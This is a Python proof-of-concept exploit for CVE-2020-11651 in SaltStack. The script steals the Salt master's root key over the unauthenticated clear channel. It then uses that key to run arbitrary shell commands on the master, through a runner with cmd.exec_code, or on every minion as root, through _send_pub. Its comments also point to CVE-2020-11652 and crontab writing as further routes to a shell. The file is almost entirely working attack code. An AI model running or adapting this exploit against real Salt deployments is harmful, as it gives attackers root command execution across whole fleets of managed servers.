#!/usr/bin/env python3
# POC for exploiting CVE-2020-11651. CVE-2020-11652 not included, but this one is the really powerful one and it should be easy enough to figure out how to get 11652 working if you need.
# Author: @dozernz
# Some code adapted from https://github.com/rossengeorgiev/salt-security-backports
#
# Pre-requsities: pip3 install salt
################################################SaltStack_rce################################################
import salt
import salt.version
import salt.transport.client
import salt.exceptions
import datetime


def ping_master(clear_channel,master_ip):
    try:
        payload = {"cmd": "ping"}
        response = clear_channel.send(payload, timeout=3)
        if response:
            return True
    except salt.exceptions.SaltReqTimeoutError:
        return False
    return False


def get_rootkey(clear_channel):
    try:
        response = clear_channel.send({'cmd': '_prep_auth_info'}, timeout=2)
        for i in response:
            if isinstance(i, dict) and len(i) == 1:
                rootkey = list(i.values())[0]
                return rootkey
        return False
    except:
        return False


def send_command_to_minions(clear_channel,cmd):
    jid = "{0:%Y%m%d%H%M%S%f}".format(datetime.datetime.utcnow())
    commond = "/bin/sh -c '{0}'".format(cmd)

    payload = {'cmd': "_send_pub", "fun": "cmd.run", "arg": [commond], "tgt": "*", "ret": "", "tgt_type": "glob",
           "user": "root", "jid": jid}
    try:
        response = clear_channel.send(payload, timeout=3)
        if response == None:
            msg = "[+] There Salt is Vuln Sending command to all minions on master Execute Success! : %s "%commond
            return True,msg
        else:
            return False
    except:
        return False


def master_shell(clear_channel,root_key, cmd):
    # This is achieved by using the stolen key to create a "runner" on the master node using the cmdmod module, then the cmd.exec_code function to run some python3 code that shells out.
    # There is a cmd.shell function but I wasn't able to get it to accept the "cmd" kwarg parameter for some reason.
    # It's also possible to use CVE-2020-11652 to get shell if the master instance is running as root by writing a crontab into a cron directory, or proably some other ways.
    # This way is nicer though, and doesn't need the master to be running as root .

    payload = {"key": root_key,
           "cmd": "runner",
           'fun': 'salt.cmd',
           "kwarg": {
               "fun": "cmd.exec_code",
               "lang": "python3",
               "code": "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
           },
           'jid': '20200504042611133934',
           'user': 'sudo_user',
           '_stamp': '2020-05-04T04:26:13.609688'}

    try:
        response = clear_channel.send(payload, timeout=3)
        msg = "[+] There Salt is Vuln Sending command to master shell: " + str(response) + ". Execute Success! : %s"%cmd
        return True,msg
    except:
        msg = "Something failed"
        return False,msg

def run(protocol,master_ip,master_port,cmd):

    master_minion_root = "master"
    #or
    #master_minion_root = "minions"

    minion_config = {
        'transport': 'zeromq',
        'pki_dir': '/tmp',
        'id': 'root',
        'log_level': 'debug',
        'master_ip': master_ip,
        'master_port': master_port.strip(),
        'auth_timeout': 5,
        'auth_tries': 1,
        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port.strip())
    }

    clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

    if not ping_master(clear_channel,master_ip):
        msg = "[-] There Salt is no Vuln: Ping The Salt Master sSrver is Down!"
        return False,msg
    if master_minion_root == "master" or master_minion_root == "minions":
        rootkey = get_rootkey(clear_channel)
        if not rootkey:
            msg = "[-] There Salt is no Vuln: Failed to fetch the root key from the instance."
            return False,msg
        else:
            if master_minion_root == "master":
                return master_shell(clear_channel,rootkey, cmd)
            else:
                return send_command_to_minions(clear_channel,cmd)


if __name__ == "__main__":
    ip = "     192.168.43.90  "
    print(run("http",ip.strip(),"4506","touch /tmp/1.txt"))